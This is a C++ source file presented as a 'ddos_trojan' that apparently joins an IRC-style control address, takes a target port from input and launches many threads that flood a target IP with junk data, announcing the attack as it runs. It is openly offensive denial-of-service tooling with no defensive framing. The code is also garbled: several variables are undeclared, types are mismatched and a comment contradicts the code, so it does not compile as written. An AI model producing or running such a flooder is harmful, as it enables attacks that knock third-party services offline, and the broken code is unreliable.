#include <iostream>
#include <thread>
#include <vector>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <cstring>
#include <time.h>

std::vector<std::thread> threads;
std::mutex mtx;

void runThread(int i, int port) {
    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    inet_pton(AF_INET, targetIP, &addr.sin_addr);
    
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        perror("socket");
        return;
    }
    connect(sockfd, (struct sockaddr*)&addr, sizeof(addr));
    
    std::lock_guard<std::mutex> lock(mtx);
    std::cout << "Thread " << i << " connected to target" << std::endl;
    
    for (size_t j = 0; j < maxGarbagePackets; ++j) {
        ssize_t sendLength = write(sockfd, garbage, sizeof(garbage));
        if (sendLength == -1) {
            perror("write");
            return;
        }
    }
    
    std::cout << "Thread " << i << " sent " << maxGarbagePackets << " packets" << std::endl;
}

int main(int argc, char* argv[]) {
    if (argc < 3) {
        std::cerr << "Usage: ./ddos_trojan <irc_channel> <target_ip>\n";
        return 1;
    }

    std::string ircChannel = argv[1];
    std::string targetIP = argv[2];
    int port = 3395; // IRC port
    
    while (true) {
        struct sockaddr_in addr;
        memset(&addr, 0, sizeof(addr));
        addr.sin_family = AF_INET;
        addr.sin_port = htons(port);
        inet_pton(AF_INET, ircChannel, &addr.sin_addr);
        
        int sockfd = socket(AF_INET, SOCK_STREAM, 0);
        if (sockfd < 0) {
            perror("socket");
            return 1;
        }
        connect(sockfd, (struct sockaddr*)&addr, sizeof(addr));
        
        std::string targetPort = "";
        while (true) {
            std::string input;
            getline(std::cin, input);
            if (input == "exit") {
                close(sockfd);
                return 0;
            } else if (sscanf(input.c_str(), "%d", &targetPort) != 1 || atoi(targetPort.c_str()) < 1025 || atoi(targetPort.c_str()) > 65535) {
                std::cout << "Invalid port" << std::endl;
            } else {
                break;
            }
        }
        
        int targetDuration = 10 * atoi(argv[2]); // Target duration in seconds (default to 10 minutes)
        
        for (size_t i = 0; i < maxThreads; ++i) {
            threads.emplace_back(runThread, i, targetPort);
        }
    
        std::cout << "Starting attack on " << targetIP << ":" << targetPort << std::endl;

        for (auto& t : threads) {
            t.join();
        }
        
        std::cout << "Attack completed" << std::endl;

        std::cout << "Enter next IRC channel or exit to quit: ";
    }

    return 0;
}
